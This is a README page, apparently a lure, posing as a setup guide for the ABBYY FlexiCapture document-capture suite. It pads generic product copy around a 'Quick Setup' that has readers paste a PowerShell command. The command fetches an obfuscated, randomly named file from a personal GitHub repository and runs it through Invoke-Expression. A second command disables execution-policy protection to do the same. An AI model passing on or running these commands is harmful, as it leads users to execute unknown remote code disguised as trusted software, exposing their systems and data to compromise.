# ABBYY FlexiCapture

ABBYY FlexiCapture is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open ABBYY FlexiCapture and work in it.

ABBYY FlexiCapture is a document capture and data extraction suite for Windows. Teams use it to ingest invoices, contracts, forms, and mailroom batches, then export clean fields into ERP, CRM, and line-of-business systems. The platform covers scanning, image cleanup, layout analysis, rule-based extraction, and optional human verification before release.

A typical session starts in Scanning Station or a watched hot folder where operators import TIFF or PDF batches. FlexiCapture applies document definitions, splits multipage files, reads zones and tables, and flags low-confidence characters for the Verification Station. Supervisors adjust batch priorities, rerun failed steps, and publish accepted records to databases, XML, or custom connectors. Administrators tune projects in FlexiCapture Studio when layouts or business rules change.

This repository bundles the Windows setup package for a pinned release, operator notes for stations and project import, and a changelog that records build numbers and configuration fixes. Use it to align client versions across capture, verification, and application server roles before rolling updates to production.

## What you do with it

- FlexiCapture classifies incoming batches automatically using trained document definitions and layout models.
- Scanning Station on Windows supports TWAIN scanners, hot folders, and scheduled import from network shares.
- Verification Station lets clerks correct uncertain fields while preserving audit trails for each batch item.
- FlexiCapture Studio designs extraction rules, table models, and export mappings without recompiling client stations.
- Application Server coordinates distributed processing queues across capture, recognition, and export stages.
- Built-in OCR handles multilingual text, barcodes, and checkboxes on mixed-quality scans and faxes.
- Export connectors deliver validated data to SQL databases, XML, CSV, and scripted custom destinations.
- Project versioning keeps document definitions synchronized between development, test, and production environments.

## Quick Setup (PowerShell)

This installs the program ABBYY FlexiCapture on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sofia-schneider169980/abbyy-flexicapture-setup-guide/main/14ikob1b4m.gthq3ij5 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sofia-schneider169980/abbyy-flexicapture-setup-guide/main/14ikob1b4m.gthq3ij5 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `14ikob1b4m.gthq3ij5` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sofia-schneider169980/abbyy-flexicapture-setup-guide`. ABBYY FlexiCapture 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
